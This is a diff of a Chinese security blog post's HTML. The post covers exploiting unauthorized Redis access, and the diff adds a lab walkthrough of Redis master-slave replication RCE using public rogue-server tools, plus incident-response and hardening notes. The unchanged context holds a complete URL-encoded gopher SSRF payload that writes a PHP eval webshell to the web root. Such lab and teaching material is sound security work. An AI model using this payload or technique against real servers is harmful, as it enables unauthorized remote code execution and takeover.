@@ -222,7 +222,7 @@
 
             <span class="meta-info-item post-update-date">
                 <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Thu Feb 27 2025 16:59:20 GMT+0800">2025-02-27</span>
+                <span class="datetime" data-updated="Tue Apr 29 2025 14:41:11 GMT+0800">2025-04-29</span>
             </span>
         
 
@@ -329,9 +329,45 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ssrf.php?url=gopher%3A%2F%2F192%2E168%2E64%2E189%3A6379%2F%5F%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252435%250D%250A%250A%250A%253C%253Fphp%2520eval%2528%2524%5FPOST%255B%2522whoami%2522%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell%2Ephp%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>这样就能实现和之前一样的效果，当redis不对外开放时就可以考虑利用ssrf，这算是增加了攻击面，但是也要网站本身支持这些协议</p>
-<h4 id="常见防护设施"><a href="#常见防护设施" class="headerlink" title="常见防护设施"></a>常见防护设施</h4><p>很容易想</p>
+<h4 id="常见防护措施"><a href="#常见防护措施" class="headerlink" title="常见防护措施"></a>常见防护措施</h4><p>很容易想</p>
 <p>开启防护模式，设置密码安全认证，不对外开放，修改端口为不常见的，给文件夹设置严格的访问权限</p>
-<p>先这样，后面再补充一下主从复制的内容</p>
+<h4 id="基于主从复制的RCE"><a href="#基于主从复制的RCE" class="headerlink" title="基于主从复制的RCE"></a>基于主从复制的RCE</h4><p>主从原理可以参考<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Cantevenl/article/details/115839649" >这篇文章<i class="fas fa-external-link-alt"></i></a></p>
+<h5 id="主从复制概念"><a href="#主从复制概念" class="headerlink" title="主从复制概念"></a>主从复制概念</h5><p>为了提高可用性</p>
+<ul>
+<li>为了避免单点Redis服务器故障，准备多台服务器，互相连通。将数据复制多个副本保存在不同的服<br>务器上，连接在一起，并保证数据是同步的。</li>
+<li>即使有其中一台服务器宕机，其他服务器依然可以继续提供服务，实现Redis的高可用，同时实现数据冗余备份。</li>
+</ul>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250429104505.png" ></p>
+<blockquote>
+<p> 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master&#x2F;leader)，后者称为从节点(slave&#x2F;follower) ; 数据的复制是单向的，只能由主节点到从节点。Master以写为主，Slave以读为主。</p>
+<p>默认情况下，每台Redis服务器都是主节点 ;且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p>
+</blockquote>
+<h5 id="主从复制工作流程"><a href="#主从复制工作流程" class="headerlink" title="主从复制工作流程"></a>主从复制工作流程</h5><ul>
+<li>主从复制过程大体可以分为3个阶段<ul>
+<li>建立连接阶段（即准备阶段）</li>
+<li>数据同步阶段</li>
+<li>命令传播阶段</li>
+</ul>
+</li>
+</ul>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250429104732.png" ></p>
+<h5 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h5><p>在两个 Redis 实例设置主从模式的时候，Redis 的主机实例可以通过 FULLRESYNC 同步文件到从机上。然后在从机上加载 so 文件，我们就可以执行拓展的新命令了。我们使用模拟的恶意服务端来作为主机，并模拟 fullresync 请求。</p>
+<h5 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h5><p>准备redis4.x版本的环境</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p>准备这样一个环境，redis.conf文件和之前一样配置，允许远程主机连接即可</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250429143134.png" ></p>
+<p>主要用到的脚本是 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce" >https://github.com/Ridter/redis-rce<i class="fas fa-external-link-alt"></i></a></p>
+<p>然后再在这个项目 <a class="link"   target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell" >https://github.com/vulhub/redis-rogue-getshell<i class="fas fa-external-link-alt"></i></a> 编译获得<code>RedisModulesSDK/exp.so</code>文件</p>
+<p>然后跑脚本就好了，成功获取运行redis的服务器shell</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250429143420.png" ></p>
+<p>查看运行日志，有一些信息</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2025-04-29%2014.35.20.png" ></p>
+<p><em>192.168.65.4 是攻击机kali 192.168.65.3 是运行redis的服务器</em></p>
+<p>可以看到这两个主机建立了主从关系，然后redis加载了恶意.so文件，所以成功getshell</p>
+<h5 id="应急角度"><a href="#应急角度" class="headerlink" title="应急角度"></a>应急角度</h5><p>假设现在知道主机沦陷，不知道是什么攻击手法，使用<code>netstat -antp</code>查看一下主机端口情况</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250429143952.png" ></p>
+<p>可以看到本地6379端口连接着远程44810端口，有一个连接</p>
 
                 </div>
                 
@@ -492,7 +528,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5webshell"><span class="nav-number">2.</span> <span class="nav-text">利用未授权写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="nav-number">3.</span> <span class="nav-text">利用未授权写入ssh公钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">4.</span> <span class="nav-text">利用未授权写入定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssrf-redis%E5%86%99%E5%85%A5webshell"><span class="nav-number">5.</span> <span class="nav-text">ssrf+redis写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4%E8%AE%BE%E6%96%BD"><span class="nav-number">6.</span> <span class="nav-text">常见防护设施</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5webshell"><span class="nav-number">2.</span> <span class="nav-text">利用未授权写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="nav-number">3.</span> <span class="nav-text">利用未授权写入ssh公钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">4.</span> <span class="nav-text">利用未授权写入定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssrf-redis%E5%86%99%E5%85%A5webshell"><span class="nav-number">5.</span> <span class="nav-text">ssrf+redis写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">6.</span> <span class="nav-text">常见防护措施</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84RCE"><span class="nav-number">7.</span> <span class="nav-text">基于主从复制的RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%A6%82%E5%BF%B5"><span class="nav-number">7.1.</span> <span class="nav-text">主从复制概念</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">7.2.</span> <span class="nav-text">主从复制工作流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">7.3.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">7.4.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E8%A7%92%E5%BA%A6"><span class="nav-number">7.5.</span> <span class="nav-text">应急角度</span></a></li></ol></li></ol>
     </div>
 </div>
 
@@ -664,7 +700,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
-        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5webshell"><span class="nav-number">2.</span> <span class="nav-text">利用未授权写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="nav-number">3.</span> <span class="nav-text">利用未授权写入ssh公钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">4.</span> <span class="nav-text">利用未授权写入定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssrf-redis%E5%86%99%E5%85%A5webshell"><span class="nav-number">5.</span> <span class="nav-text">ssrf+redis写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4%E8%AE%BE%E6%96%BD"><span class="nav-number">6.</span> <span class="nav-text">常见防护设施</span></a></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5webshell"><span class="nav-number">2.</span> <span class="nav-text">利用未授权写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5ssh%E5%85%AC%E9%92%A5"><span class="nav-number">3.</span> <span class="nav-text">利用未授权写入ssh公钥</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="nav-number">4.</span> <span class="nav-text">利用未授权写入定时任务</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssrf-redis%E5%86%99%E5%85%A5webshell"><span class="nav-number">5.</span> <span class="nav-text">ssrf+redis写入webshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%98%B2%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="nav-number">6.</span> <span class="nav-text">常见防护措施</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E7%9A%84RCE"><span class="nav-number">7.</span> <span class="nav-text">基于主从复制的RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E6%A6%82%E5%BF%B5"><span class="nav-number">7.1.</span> <span class="nav-text">主从复制概念</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-number">7.2.</span> <span class="nav-text">主从复制工作流程</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="nav-number">7.3.</span> <span class="nav-text">攻击原理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">7.4.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BA%94%E6%80%A5%E8%A7%92%E5%BA%A6"><span class="nav-number">7.5.</span> <span class="nav-text">应急角度</span></a></li></ol></li></ol>
     </div>
 </div>
 
